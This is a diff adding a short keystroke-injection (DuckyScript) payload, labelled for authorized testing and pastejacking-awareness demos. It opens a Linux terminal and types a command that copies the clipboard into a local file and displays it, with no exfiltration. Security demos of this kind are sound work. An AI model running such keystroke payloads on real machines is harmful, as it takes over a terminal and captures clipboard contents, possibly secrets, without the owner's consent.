@@ -1,0 +1,11 @@
+REM Title:  Clipboard snapshot (Linux) -- LOCAL ONLY
+REM Class:  data-at-rest access / pastejacking awareness
+REM Effect: saves current clipboard to ~/clipboard_<host>.txt. No exfiltration.
+REM Note:   supports Wayland (wl-paste) and X11 (xclip/xsel).
+REM Use:    authorized testing / awareness demos only.
+DEFAULT_DELAY 40
+DELAY 1000
+CTRL ALT t
+DELAY 1500
+STRING F=~/clipboard_$(hostname).txt; (wl-paste 2>/dev/null || xclip -o -selection clipboard 2>/dev/null || xsel -b 2>/dev/null) > "$F"; (xdg-open "$F" 2>/dev/null || cat "$F")
+ENTER
